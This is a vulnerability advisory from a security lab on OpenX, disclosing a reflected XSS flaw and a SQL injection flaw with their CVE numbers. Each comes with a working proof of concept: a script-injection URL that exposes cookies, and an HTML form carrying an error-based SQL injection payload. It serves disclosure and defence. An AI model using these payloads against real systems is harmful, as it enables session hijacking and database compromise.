Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in OpenX, which can be exploited to perform Cross-Site Scripting (XSS) and SQL Injection attacks.


1) Cross-Site Scripting (XSS) in OpenX: CVE-2012-4989

Input passed via the "parent" GET parameter to /www/admin/plugin-index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of an affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/www/admin/plugin-index.php?action=info&group=vastInlineBannerTypeHtml&parent=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E


2) SQL Injection in OpenX: CVE-2012-4990

Input passed via the "ids[]" POST parameter to /www/admin/campaign-zone-link.php is not properly sanitised before being used in SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC demonstrates the vulnerability: 


<form action="http://[host]/www/admin/campaign-zone-link.php" method="post">
<input type="hidden" name="action" value='link' />
<input type="hidden" name="ids[]" value="z1)) OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- " />
<input type="hidden" name="clientid" value='[CLIENT_ID]' />
<input type="hidden" name="campaignid" value='[CAMPAIGN_ID]' />
<input type="hidden" name="" value='' />
<input type="hidden" name="" value='' />
<input type="hidden" name="" value='' />
<input type="hidden" name="" value='' />
<input type="submit" id="btn">
</form>


Successful exploitation of this vulnerability requires attacker to be registered, logged-in and have permission to access link zone.
